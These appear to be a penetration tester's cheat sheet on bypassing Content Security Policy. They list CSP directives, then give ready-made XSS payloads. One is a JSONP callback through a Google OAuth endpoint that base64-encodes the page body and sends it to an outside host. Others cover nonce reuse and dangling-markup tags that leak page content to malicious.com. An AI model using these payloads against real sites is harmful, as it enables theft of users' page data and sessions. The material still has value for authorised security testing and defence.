# Content Security Policy

Sanitize javascript code execution to limit XSS risks

## Keys
- default-src
- img-src'
- script-src
- style-src 
- report-uri
- font-src
- frame-src 
- media-src 
- object-src 


## Load the page before action
`setTimeout()` is very useful when something require the entire page to load before the code is being executed
```js
setTimeout(function(){
	//code here
},1000); //Time in ms here
```
```js
setInterval()

Function('code')
.prototype.constructor('code')
```

## Bypass JSONP : 
JSONBee has pre created payloads : https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt 

##### Endpoint
```
https://accounts.google.com/o/oauth2/revoke?callback=CODE_HERE
```
#### Example
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=window.location=''.concat('https://myurl.com/?c=', btoa(document.body.innerHTML));"></script>
```

## Nonce Bypass
```html
<script nonce="VALUE_HERE">alert(1)</script>
```

## Dangling markup
In dangling markup, you want to not terminate the string from your payload to compromise everithing in between your payload and the following 
```
" ' `
```

```html
<img src='http://malicious.com/?c=
<meta http-equiv="refresh" content='4; URL=https://malicious.com/?c=
```
https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection